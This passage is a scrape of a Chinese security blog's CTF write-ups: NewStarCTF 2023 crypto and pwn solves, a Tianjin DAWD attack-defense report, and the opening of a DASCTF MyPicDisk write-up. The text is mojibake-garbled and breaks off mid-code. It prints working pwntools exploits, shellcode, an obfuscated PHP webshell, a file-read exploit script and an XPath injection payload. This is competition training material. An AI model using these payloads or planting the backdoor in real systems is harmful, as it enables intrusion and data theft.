Bugku CTFï¼Œå¾—åˆ°c55192c992036ef623372601ff3a&#125;ã€‚ æ‹¼æ¥ä¸€ä¸‹ï¼Œå¾—åˆ°flagï¼šflag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125; Affineé™„ä»¶ä¸€æ®µpython 12345678910from flag import flag, keyciphertext = []for f in flag: ciphertext.append((key[0]*f + key[1]) % 256)print(bytes(ciphertext).hex())# dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064 å› ä¸ºflagå‰4ä¸ªå­—æ¯æ˜¯flagï¼Œå› æ­¤å¯ä»¥åˆ—å‡º4ä¸ªæ–¹ç¨‹ 1234221+256*a=key0*102+key167+256*b=key0*108+key1136+256*c=key0*97+key1238+256*d=key0*103+key1 å¾—åˆ° 12key0 = (52 + 256 * (a - b + c - d)) / -12key1 = 221 + 256 * a - key0 * 102 æµ‹è¯•çŒœæµ‹key0&#x3D;17ï¼Œkey1&#x3D;23 è§£å¯† 1234567891011121314151617181920212223242526# å¯†æ–‡å’Œå¯†é’¥ciphertext_hex = &quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;key = (17, 23) # è¯·å°†aå’Œbæ›¿æ¢ä¸ºå®é™…çš„å¯†é’¥å€¼# è®¡ç®—key[0]çš„æ¨¡æ•°é€†def mod_inverse(a, m): m0, x0, x1 = m, 0, 1 while a &gt; 1: q = a // m m, a = a % m, m x0, x1 = x1 - q * x0, x0 return x1 + m0 if x1 &lt; 0 else x1# å°†å¯†æ–‡è½¬æ¢ä¸ºå­—èŠ‚åˆ—è¡¨ciphertext_bytes = bytes.fromhex(ciphertext_hex)flag = []# é€†å‘è§£å¯†for c in ciphertext_bytes: original_byte = ((c - key[1]) * mod_inverse(key[0], 256)) % 256 flag.append(original_byte)# å°†è§£å¯†åçš„å­—èŠ‚åˆ—è¡¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²original_flag = bytes(flag).decode(&#x27;utf-8&#x27;)print(original_flag) å¾—åˆ°flagï¼šflag&#123;4ff1ne_c1pher_i5_very_3azy&#125; babyaesæ‰“å¼€é™„ä»¶ 123456789101112131415161718192021222324from Crypto.Cipher import AESimport osfrom flag import flagfrom Crypto.Util.number import *def pad(data): return data + b&quot;&quot;.join([b&#x27;\\x00&#x27; for _ in range(0, 16 - len(data))])def main(): flag_ = pad(flag) key = os.urandom(16) * 2 iv = os.urandom(16) print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1) aes = AES.new(key, AES.MODE_CBC, iv) enc_flag = aes.encrypt(flag_) print(enc_flag)if __name__ == &quot;__main__&quot;: main()# 3657491768215750635844958060963805125333761387746954618540958489914964573229# b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27; keyæ˜¯32bytes,256bits ï¼›ivæ˜¯16bytes ,128bits key^iv ï¼Œé‚£ä¹ˆåªæœ‰ iv ä¸ keyçš„ä½128ä½ç›¸å¼‚æˆ–ï¼Œæ‰€ä»¥keyçš„é«˜128ä½æ˜¯å›ºå®šä¸å˜çš„ã€‚æ‰€ä»¥è¾“å‡ºç»“æœçš„é«˜128bits,å°±æ˜¯keyçš„é«˜128bits,è¿›è€Œå¯ä»¥å¾—åˆ°keyçš„æ‰€æœ‰å€¼256bitsã€‚ ä¹‹åkeyçš„ä½128bitsï¼Œä¸è¾“å‡ºç»“æœçš„ä½128bitsç›¸å¼‚æˆ–ï¼Œæ‰€å¾—ç»“æœå°±æ˜¯ivçš„å€¼äº† è§£å¯†ï¼š 1234567891011121314151617from Crypto.Cipher import AESimport osfrom gmpy2 import*from Crypto.Util.number import*xor = 3657491768215750635844958060963805125333761387746954618540958489914964573229^1enc_flag = b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27;out = long_to_bytes(xor)key = out[:16]*2# print(key)iv = bytes_to_long(key[16:])^bytes_to_long(out[16:])# print(iv)iv = long_to_bytes(iv)# print(iv)aes = AES.new(key,AES.MODE_CBC,iv)flag = aes.decrypt(enc_flag)print(flag) å¾—åˆ°b&#39;firsT_cry_Aes\\x00\\x00\\x00&#39; flagï¼šflag&#123;firsT_cry_Aes&#125; Pwn3&#x2F;5 ret2textæ ˆæº¢å‡º idaæ‰“å¼€å‘ç°æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œè€Œä¸”è¿˜æœ‰åé—¨backdoor()å‡½æ•° åæ±‡ç¼–ä»£ç  12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); puts(&quot;Welcome to NewStar CTF!!&quot;); puts(&quot;Show me your magic&quot;); read(0, buf, 0x100uLL); return 0;&#125; backdoorä»£ç  12345int backdoor()&#123; puts(&quot;Congratulations!!!&quot;); return execve(&quot;/bin/sh&quot;, 0LL, 0LL);&#125; backdooråœ°å€00000000004011FB ç¼–å†™è„šæœ¬ 1234567891011121314151617from pwn import *return_address = 0x4011FBpadding = b&#x27;A&#x27; * 40# æ„é€ payloadpayload = padding + p64(return_address)# è¿æ¥ç›®æ ‡æœåŠ¡r = remote(&#x27;node4.buuoj.cn&#x27;,27081)r.recvline()r.recvline()# å‘é€payloadr.sendline(payload)# æ¥æ”¶å“åº”r.interactive() ä¹‹åç›´æ¥cat flagå³å¯æ‹¿åˆ°flagï¼šflag&#123;11b564d9-fb42-41c6-a215-a750c4fc8c28&#125; ezshellcodeåæ±‡ç¼– 1234567891011int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; void *buf; // [rsp+8h] [rbp-8h] init(argc, argv, envp); buf = (void *)(int)mmap((void *)0x66660000, 0x1000uLL, 7, 50, -1, 0LL); puts(&quot;Welcome to NewStar CTF!!&quot;); puts(&quot;Show me your magic&quot;); read(0, buf, 0x100uLL); JUMPOUT(0x66660000LL);&#125; ç›´æ¥å†™shellcodeå³å¯ï¼Œç½‘ä¸Šéšä¾¿æœä¸€ä¸ªshellcodeï¼Œç¼–å†™è„šæœ¬ 123456789101112131415161718from pwn import *# shellcodeshellcode = b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;# å¯åŠ¨è¿›ç¨‹r = remote(&#x27;node4.buuoj.cn&#x27;,28681)# è¯»å–æ¬¢è¿ä¿¡æ¯print(r.recv())# å†™å…¥shellcodeåˆ°å†…å­˜å—r.sendline(shellcode)r.interactive()# å…³é—­è¿›ç¨‹r.close() ç›´æ¥cat flag newstar shopä¸»å‡½æ•° 123456789101112131415161718192021222324252627282930int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+8h] [rbp-8h] v4 = __readfsqword(0x28u); init(argc, argv, envp); while ( 1 ) &#123; menu(); if ( (int)__isoc99_scanf(&quot;%d&quot;, &amp;v3) &lt;= 0 ) puts(&quot;Invalid input&quot;); switch ( v3 ) &#123; case 1: shop(); break; case 2: makemoney(); break; case 3: dont_try(); break; default: puts(&quot;nothing here&quot;); puts(&quot;\\n&quot;); break; &#125; &#125;&#125; menu() 12345678910111213unsigned __int64 menu()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); puts(&quot;=================&quot;); puts(&quot;1.Go to the shop &quot;); puts(&quot;2.Make some money&quot;); puts(&quot;3.Don&#x27;t choose &quot;); puts(&quot;=================&quot;); puts(&quot;\\n&quot;); return v1 - __readfsqword(0x28u);&#125; shop() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869unsigned __int64 shop()&#123; int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;=============================&quot;); puts(&quot;===Welcome to newstar shop===&quot;); puts(&quot;=============================&quot;); puts(&quot;1.newstar&#x27;s gift 20$&quot;); puts(&quot;2.pwn write up 40$&quot;); puts(&quot;3.shell 9999$&quot;); puts(&quot;\\n&quot;); puts(&quot;All things are only available for one day!&quot;); puts(&quot;What do you want to buy?&quot;); puts(&quot;\\n&quot;); if ( (int)__isoc99_scanf(&quot;%d&quot;, &amp;v1) &lt;= 0 ) puts(&quot;Invalid input&quot;); if ( v1 != 3 ) &#123; if ( v1 &gt; 3 ) &#123;LABEL_17: puts(&quot;nothing here&quot;); puts(&quot;\\n&quot;); return v2 - __readfsqword(0x28u); &#125; if ( v1 == 1 ) &#123; if ( (unsigned int)money &gt; 0x13 ) &#123; money -= 20; puts(&quot;You buy a newstar&#x27;s gift&quot;); puts(&quot;That is the gift:&quot;); puts(&quot;What will happen when int transfer to unsigned int?&quot;); goto LABEL_10; &#125; &#125; else &#123; if ( v1 != 2 ) goto LABEL_17; if ( (unsigned int)money &gt; 0x27 ) &#123; money -= 40; puts(&quot;You buy a pwn write up&quot;); puts(&quot;That is free after the match,haha&quot;); goto LABEL_10; &#125; &#125; puts(&quot;Sorry,you don&#x27;t have enough money&quot;);LABEL_10: puts(&quot;\\n&quot;); return v2 - __readfsqword(0x28u); &#125; if ( (unsigned int)money &gt; 0x270E ) &#123; money = 0; puts(&quot;How do you buy it?&quot;); puts(&quot;\\n&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;Sorry,you don&#x27;t have enough money&quot;); puts(&quot;\\n&quot;); &#125; return v2 - __readfsqword(0x28u);&#125; makemoney() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859unsigned __int64 makemoney()&#123; int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;============================&quot;); puts(&quot;==========Job list==========&quot;); puts(&quot;============================&quot;); puts(&quot;1.McDonald part time job 20$&quot;); puts(&quot;2.MeiTuan takeout 40$&quot;); puts(&quot;3.Giving out leaflets 60$&quot;); puts(&quot;What do you want to do?&quot;); puts(&quot;\\n&quot;); if ( (int)__isoc99_scanf(&quot;%d&quot;, &amp;v1) &lt;= 0 ) puts(&quot;Invalid input&quot;); switch ( v1 ) &#123; case 1: if ( hour &lt;= 3 ) goto LABEL_12; puts(&quot;You chose McDonald&#x27;s part time job&quot;); puts(&quot;It took you 4hours and earned 20$&quot;); puts(&quot;\\n&quot;); hour -= 4; money += 20; break; case 2: if ( hour &lt;= 7 ) &#123;LABEL_12: puts(&quot;You need to rest&quot;); puts(&quot;\\n&quot;); return v2 - __readfsqword(0x28u); &#125; puts(&quot;You chose MeiTuan takeout&quot;); puts(&quot;It took you 8hours and earned 40$&quot;); puts(&quot;\\n&quot;); hour -= 8; money += 40; break; case 3: if ( hour &gt; 11 ) &#123; puts(&quot;You chose giving out leaflets&quot;); puts(&quot;It took you 12hours and earned 60$&quot;); puts(&quot;\\n&quot;); hour -= 12; money += 60; return v2 - __readfsqword(0x28u); &#125; goto LABEL_12; default: puts(&quot;nothing here&quot;); puts(&quot;\\n&quot;); return v2 - __readfsqword(0x28u); &#125; return v2 - __readfsqword(0x28u);&#125; dont_try() 12345678910111213141516unsigned __int64 dont_try()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); if ( chance ) &#123; puts(&quot;You shouldn&#x27;t choose this&quot;); puts(&quot;Please remember, the shop owner doesn&#x27;t like his secret to be found&quot;); puts(&quot;To punish your choice, you will lose 50$ and you will never be able to choose it!&quot;); puts(&quot;\\n&quot;); money -= 50; --chance; &#125; return v1 - __readfsqword(0x28u);&#125; åŸç†ï¼šæœ‰ç¬¦å·å‹è´Ÿæ•°intè½¬åŒ–ä¸ºæ— ç¬¦å·intä¼šå¯¼è‡´æ— ç¬¦å·intæ•°å€¼ç‰¹åˆ«å¤§ å› æ­¤ï¼Œå…ˆæŠŠæ‰€æœ‰moneyèŠ±å…‰ï¼Œä¹‹åå»dont_try()å‡½æ•°å‡é’±ï¼Œå°†å…¶å˜æˆè´Ÿæ•°ï¼Œå³å¯ä¹°åˆ°shell æ€»ç»“ä½œä¸ºæ–°ç”Ÿèµ›ï¼Œè¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå¯¹åˆå­¦è€…æ¯”è¾ƒå‹å¥½ã€‚ è´´ä¸€ä¸ªå®˜æ–¹wpï¼šNewStarCTF 2023 Week1 å®˜æ–¹WriteUp (shimo.im)","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"},{"name":"reverse","slug":"reverse","permalink":"https://blog.lazyforever.top/tags/reverse/"},{"name":"misc","slug":"misc","permalink":"https://blog.lazyforever.top/tags/misc/"},{"name":"pwn","slug":"pwn","permalink":"https://blog.lazyforever.top/tags/pwn/"},{"name":"crypto","slug":"crypto","permalink":"https://blog.lazyforever.top/tags/crypto/"}]},{"title":"å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›","slug":"2023tianjindawd","date":"2023-09-19T05:07:18.000Z","updated":"2023-11-05T14:44:09.673Z","comments":true,"path":"2023/09/19/2023tianjindawd/","link":"","permalink":"https://blog.lazyforever.top/2023/09/19/2023tianjindawd/","excerpt":"","text":"ä»‹ç»æ­¤æ¬¡æ¯”èµ›è®¾DAWDæ”»é˜²èµ›å’Œåº”æ€¥å“åº”å®æˆ˜åœºæ™¯èµ›ä¸¤ä¸ªèµ›é¢˜ç±»å‹ï¼Œä¸¤ç§èµ›é¢˜åŒæ—¶å¼€èµ›ï¼Œå…¶ä¸­ï¼š â‘  DAWDæ”»é˜²èµ›ä¼šæä¾›4ä¸ªæ”»é˜²é¢˜ç›®ç¯å¢ƒï¼Œ2ä¸ªwebé¢˜ç›®ç¯å¢ƒï¼Œ2ä¸ªpwné¢˜ç›®ç¯å¢ƒï¼Œæ¯”èµ›å¼€å§‹æ—¶å…¨éƒ¨å¼€æ”¾ï¼› â‘¡ åº”æ€¥å“åº”å®æˆ˜åœºæ™¯èµ›å…±ä¸€ä¸ªåœºæ™¯ï¼Œåœºæ™¯èµ›åŒ…å«å¤šä¸ªé¢˜ç›®ï¼Œæ ¹æ®é—®é¢˜çš„éš¾åº¦ä¼šè®¾ç½®ä¸åŒçš„åˆ†å€¼ï¼Œé€‰æ‰‹å¯ä»¥é€šè¿‡æäº¤ä¸åŒé¢˜ç›®è·å–ç›¸åº”çš„åˆ†å€¼ã€‚ æ’åé˜Ÿä¼åå­— NKV DAWDæ”»é˜²èµ›æ’åç¬¬ä¸€ åº”æ€¥å“åº”æ’åç¬¬ä¸ƒ æ€»åˆ†ç¬¬ä¸€ è¿‡ç¨‹dawdçš„shopé¢˜ç›®æˆ‘ä»¬å®¡è®¡å‡ºäº†ä¸¤ä¸ªæ¼æ´ ç¬¬ä¸€ä¸ªæ˜¯åœ¨&#x2F;config&#x2F;config.php 1234567891011&lt;?php@$_++;$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;&#125;&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;&#123;&quot;^&quot;/&quot;);$___=(&quot;$&quot;^&quot;&#123;&quot;).(&quot;~&quot;^&quot;.&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;-&quot;^&quot;~&quot;).(&quot;(&quot;^&quot;|&quot;);$&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);?&gt; ä¸€ä¸ªæ˜æ˜¾çš„åé—¨ï¼Œç›¸å½“äº$_GET[&#39;0&#39;]($_POST[&#39;1&#39;]) ç›´æ¥system(&#39;cat /flag&#39;)å°±è¡Œ å¦ä¸€ä¸ªæ˜¯åœ¨&#x2F;controller&#x2F;index.class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?phpclass indexController extends medoo&#123; function index() &#123; $date = get(&#x27;time&#x27;); switch ($date) &#123; case &#x27;today&#x27;: $datas[&#x27;time&#x27;] = &#x27;today&#x27;; break; case &#x27;yestoday&#x27;: $datas[&#x27;time&#x27;] = &#x27;yestoday&#x27;; break; case &#x27;before&#x27;: $datas[&#x27;time&#x27;] = &#x27;before&#x27;; break; default: $datas[&#x27;time&#x27;] = &#x27;today&#x27;; break; &#125; $datas[&#x27;title&#x27;] = &#x27;ASHOP&#x27;; $database = new index(); $datas[&#x27;cats&#x27;] = $database-&gt;get_cats(); $user_data = array(); $user_data[&#x27;time&#x27;] = time(); $user_data[&#x27;ip&#x27;] = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; setcookie(&quot;AshopToken&quot;, base64_encode(serialize($user_data))); $this-&gt;display( $datas ); &#125; function cat() &#123; $catid = get(&#x27;id&#x27;); $datas[&#x27;title&#x27;] = &#x27;cat | ASHOP&#x27;; $datas[&#x27;catid&#x27;] = $catid; $database = new index(); $datas[&#x27;cats&#x27;] = $database-&gt;get_cats(); $this-&gt;display( $datas ); &#125; function more() &#123; $date = get(&#x27;time&#x27;); switch ($date) &#123; case &#x27;today&#x27;: $time = date(&#x27;Y-m-d&#x27;,time()); break; case &#x27;yestoday&#x27;: $time = date(&#x27;Y-m-d&#x27;,strtotime(&#x27;-1 day&#x27;)); break; case &#x27;before&#x27;: $time = date(&#x27;Y-m-d&#x27;,strtotime(&#x27;-2 day&#x27;)); break; &#125; $database = new index(); $datas[&#x27;contents&#x27;] = $database-&gt;get_contents( $time ); $data = $datas[&#x27;contents&#x27;]; $result = $database-&gt;get_more( $data ); echo $result; &#125; function cat_more() &#123; $catid = get(&#x27;id&#x27;); $database = new index(); $datas[&#x27;contents&#x27;] = $database-&gt;cat_contents( $catid ); $data = $datas[&#x27;contents&#x27;]; //print_r($data); $result = $database-&gt;get_more( $data ); echo $result; &#125; function show_pic() &#123; $pic = get(&#x27;file&#x27;); if ($pic != null)&#123; header(&quot;Content-type:image/jpeg&quot;); echo file_get_contents($pic); &#125; &#125;&#125; å…¶ä¸­æœ«å°¾å¤„ 12345678function show_pic() &#123; $pic = get(&#x27;file&#x27;); if ($pic != null)&#123; header(&quot;Content-type:image/jpeg&quot;); echo file_get_contents($pic); &#125; &#125; å‚æ•°fileç›´æ¥ä½œä¸ºå˜é‡è¿›è¡Œfile_get_contentsï¼Œæ²¡æœ‰å¯¹å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ç›´æ¥?c=index&amp;a=show_pic&amp;file=/flagå°±å¯ä»¥æ‹¿åˆ°flag è¿™é‡Œç›´æ¥è´´ä¸Šæˆ‘çš„exp 12345678910111213141516171819202122232425262728293031323334import reimport requestsimport sys# æ­£åˆ™åŒ¹é…flagdef find_flag (str): pattern = r&#x27;^flag\\&#123;.*\\&#125;$&#x27; result = re.match(pattern, str).group(0) return result# åˆå§‹åŒ–try: HOST = sys.argv[1] PORT = sys.argv[2]except: passurl=f&quot;http://&#123;HOST&#125;:&#123;PORT&#125;/config/config.php?0=system&quot;uri=&quot;&quot;target=url+uridata=&#123; &#x27;1&#x27;:&#x27;cat /flag&#x27;&#125;url2=f&quot;http://&#123;HOST&#125;:&#123;PORT&#125;/?c=index&amp;a=show_pic&amp;file=php://filter/resource=/flag&quot;try: a=requests.post(target,data=data) print(find_flag(a.text))except Exception as e: a=requests.post(url2) print((str(a.text)[-43:-1])) patchä¹Ÿè´´ä¸Š patch.sh 123#!/bin/bashpython3 patch.py cp index.class.php /var/www/html/controller/index.class.php index.class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phpclass indexController extends medoo&#123; function index() &#123; $date = get(&#x27;time&#x27;); switch ($date) &#123; case &#x27;today&#x27;: $datas[&#x27;time&#x27;] = &#x27;today&#x27;; break; case &#x27;yestoday&#x27;: $datas[&#x27;time&#x27;] = &#x27;yestoday&#x27;; break; case &#x27;before&#x27;: $datas[&#x27;time&#x27;] = &#x27;before&#x27;; break; default: $datas[&#x27;time&#x27;] = &#x27;today&#x27;; break; &#125; $datas[&#x27;title&#x27;] = &#x27;ASHOP&#x27;; $database = new index(); $datas[&#x27;cats&#x27;] = $database-&gt;get_cats(); $user_data = array(); $user_data[&#x27;time&#x27;] = time(); $user_data[&#x27;ip&#x27;] = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; setcookie(&quot;AshopToken&quot;, base64_encode(serialize($user_data))); $this-&gt;display($datas); &#125; function cat() &#123; $catid = get(&#x27;id&#x27;); $datas[&#x27;title&#x27;] = &#x27;cat | ASHOP&#x27;; $datas[&#x27;catid&#x27;] = $catid; $database = new index(); $datas[&#x27;cats&#x27;] = $database-&gt;get_cats(); $this-&gt;display($datas); &#125; function more() &#123; $date = get(&#x27;time&#x27;); switch ($date) &#123; case &#x27;today&#x27;: $time = date(&#x27;Y-m-d&#x27;, time()); break; case &#x27;yestoday&#x27;: $time = date(&#x27;Y-m-d&#x27;, strtotime(&#x27;-1 day&#x27;)); break; case &#x27;before&#x27;: $time = date(&#x27;Y-m-d&#x27;, strtotime(&#x27;-2 day&#x27;)); break; &#125; $database = new index(); $datas[&#x27;contents&#x27;] = $database-&gt;get_contents($time); $data = $datas[&#x27;contents&#x27;]; $result = $database-&gt;get_more($data); echo $result; &#125; function cat_more() &#123; $catid = get(&#x27;id&#x27;); $database = new index(); $datas[&#x27;contents&#x27;] = $database-&gt;cat_contents($catid); $data = $datas[&#x27;contents&#x27;]; //print_r($data); $result = $database-&gt;get_more($data); echo $result; &#125; function show_pic() &#123; $pic = get(&#x27;file&#x27;); if (strpos($pic, &quot;flag&quot;) !== false) &#123; $pic = &#x27;&#x27;; &#125; if ($pic != null) &#123; header(&quot;Content-type:image/jpeg&quot;); echo file_get_contents($pic); &#125; &#125;&#125; patch.py 123456789import osfile_path = &quot;/var/www/html/config/config.php&quot;try: os.remove(file_path) print(f&quot;File &#123;file_path&#125; has been successfully deleted.&quot;)except OSError as e: print(f&quot;Error deleting &#123;file_path&#125;: &#123;e&#125;&quot;) åº”æ€¥å“åº”è€ƒå¯Ÿæ›´å¤šçš„æ˜¯ä¸€äº›æœ¨é©¬å’Œå‹’ç´¢ç—…æ¯’çš„çŸ¥è¯†ï¼Œæ¨¡å¼ä¸ctfç­”é¢˜æ¨¡å¼å·®ä¸å¤šï¼Œåªä¸è¿‡æ¯é“é¢˜ç»™åˆ†æ˜¯å›ºå®šçš„ã€‚ æ€»ç»“ç¬¬ä¸€æ¬¡æ‰“ dawd æ¨¡å¼ï¼Œæ„Ÿè§‰ dawd æ˜¯ awd çš„ç®€åŒ–ç‰ˆï¼Œæ²¡æœ‰ä¸æ­»é©¬è¿™ç§ä¸€æ¬¡æ‰“ä¸­æ¯æ¬¡éƒ½èƒ½æ‹¿åˆ†çš„éªšæ“ä½œï¼Œæ›´åŠ è€ƒéªŒå¤§å®¶å†™è„šæœ¬çš„é€Ÿåº¦å’Œç†Ÿç»ƒåº¦ã€‚ æ¯”èµ›æœ‰ç‚¹æ°´ï¼Œä¸»è¦é dawdæ”»é˜²æ‹‰åˆ†ï¼Œå› ä¸ºæˆ‘ä»¬é˜Ÿç¬¬ä¸‰è½®å°±å¼€å§‹æ‹¿åˆ†ï¼Œç­‰åˆ«çš„é˜Ÿä¼å¼€å§‹æ‹¿åˆ†çš„æ—¶å€™å°±å·²ç»ç”©å¼€å¥½å¤šåˆ†æ•°äº†ã€‚ åº”æ€¥å“åº”æœ€ååªå·®3é“é¢˜æ²¡ç­”ä¸Šæ¥ï¼Œæˆ‘æ²¡åšå‡ é“é¢˜ï¼Œä¸»è¦é é˜Ÿå‹cï¼Œé˜Ÿå‹tqlã€‚ å…³äºè¿™ä¸ªæ¯”èµ›æ„Ÿè§‰åˆèµ›å…¥å›´è¿˜æ˜¯æŒºå®¹æ˜“çš„ï¼Œéšä¾¿ä¼šåšå‡ é“é¢˜å°±å¯ä»¥å…¥å›´ï¼Œå¤èµ›éš¾åº¦ä¹Ÿä¸å¤§ï¼Œä½†æ˜¯èµ›å‰æ²¡æœ‰åŸ¹è®­å°±å¾ˆç¦»è°±ï¼Œéƒ½æ‰“ä¸Šæ¯”èµ›äº†æ‰å»å‘æäº¤expçš„æ–¹æ³•ï¼Œå¾ˆå¤šé˜Ÿä¼è¿awdéƒ½æ²¡æ€ä¹ˆå‚ä¸è¿›æ¥ï¼Œå‡ ä¹æ²¡æœ‰å‡ åªé˜Ÿä¼é˜²å®ˆçš„å……åˆ†ï¼Œå¯¼è‡´å…ˆæ‹¿åˆ†çš„é˜Ÿä¼æ¯”åæ‹¿åˆ†çš„é˜Ÿä¼åˆ†æ•°é«˜äº†å¾ˆå¤šï¼Œåæ‹¿åˆ†çš„å¾ˆéš¾è¿½ä¸Šã€‚ è´´ä¸ªé¢˜ç›®é“¾æ¥ï¼š web-shop å¦ä¸€é“webé¢˜ï¼Œå¿˜è®°åå­—äº† pwn-ttt è¿˜æœ‰ä¸€é“pwné¢˜æ‰¾ä¸åˆ°äº†ã€‚ã€‚ã€‚","categories":[{"name":"awd","slug":"awd","permalink":"https://blog.lazyforever.top/categories/awd/"}],"tags":[{"name":"rce","slug":"rce","permalink":"https://blog.lazyforever.top/tags/rce/"},{"name":"php","slug":"php","permalink":"https://blog.lazyforever.top/tags/php/"},{"name":"awd","slug":"awd","permalink":"https://blog.lazyforever.top/tags/awd/"}]},{"title":"[DASCTF 2023 & 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›] MyPicDisk","slug":"2023dasctf_MyPicDisk","date":"2023-07-27T14:30:16.000Z","updated":"2023-10-06T06:16:59.077Z","comments":true,"path":"2023/07/27/2023dasctf_MyPicDisk/","link":"","permalink":"https://blog.lazyforever.top/2023/07/27/2023dasctf_MyPicDisk/","excerpt":"","text":"è¿‡ç¨‹å¼€å¯å®¹å™¨ï¼Œå‘ç°ä»¥ä¸‹è¡¨å•ï¼Œè¡¨å•ä¿¡æ¯é€šè¿‡postæ–¹æ³•ä¼ é€ é€šè¿‡xpathä¸‡èƒ½æ³¨å…¥ 1username=admin&#x27;&amp;password=&#x27;]|//*|//*[&#x27;&amp;submit=%E7%99%BB%E5%BD%95 æ³¨å…¥æˆåŠŸï¼Œburpè§‚å¯Ÿè¿”å›åŒ…å‘ç°æ³¨é‡Šä¿¡æ¯è·å¾—æç¤ºä¸‹è½½æºç &#x2F;y0u_cant_find_1t.zip å¾—åˆ°æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121&lt;?phpsession_start();error_reporting(0);class FILE&#123; public $filename; public $lasttime; public $size; public function __construct($filename) &#123; if (preg_match(&quot;/\\//i&quot;, $filename)) &#123; throw new Error(&quot;hacker!&quot;); &#125; $num = substr_count($filename, &quot;.&quot;); if ($num != 1) &#123; throw new Error(&quot;hacker!&quot;); &#125; if (!is_file($filename)) &#123; throw new Error(&quot;???&quot;); &#125; $this-&gt;filename = $filename; $this-&gt;size = filesize($filename); $this-&gt;lasttime = filemtime($filename); &#125; public function remove() &#123; unlink($this-&gt;filename); &#125; public function show() &#123; echo &quot;Filename: &quot; . $this-&gt;filename . &quot; Last Modified Time: &quot; . $this-&gt;lasttime . &quot; Filesize: &quot; . $this-&gt;size . &quot;&lt;br&gt;&quot;; &#125; public function __destruct() &#123; system(&quot;ls -all &quot; . $this-&gt;filename); &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;MyPicDisk&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php if (!isset($_SESSION[&#x27;user&#x27;])) &#123; echo &#x27;&lt;form method=&quot;POST&quot;&gt; usernameï¼š&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt; passwordï¼š&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt; &lt;input type=&quot;submit&quot; value=&quot;ç™»å½•&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;&lt;/form&gt;&#x27;; $xml = simplexml_load_file(&#x27;/tmp/secret.xml&#x27;); if ($_POST[&#x27;submit&#x27;]) &#123; $username = $_POST[&#x27;username&#x27;]; $password = md5($_POST[&#x27;password&#x27;]); $x_query = &quot;/accounts/user[username=&#x27;&#123;$username&#125;&#x27; and password=&#x27;&#123;$password&#125;&#x27;]&quot;; $result = $xml-&gt;xpath($x_query); if (count($result) == 0) &#123; echo &#x27;ç™»å½•å¤±è´¥&#x27;; &#125; else &#123; $_SESSION[&#x27;user&#x27;] = $username; echo &quot;&lt;script&gt;alert(&#x27;ç™»å½•æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;; &#125; &#125; &#125; else &#123; if ($_SESSION[&#x27;user&#x27;] !== &#x27;admin&#x27;) &#123; echo &quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;; unset($_SESSION[&#x27;user&#x27;]); echo &quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;; &#125; echo &quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;; if (!$_GET[&#x27;file&#x27;]) &#123; foreach (scandir(&quot;.&quot;) as $filename) &#123; if 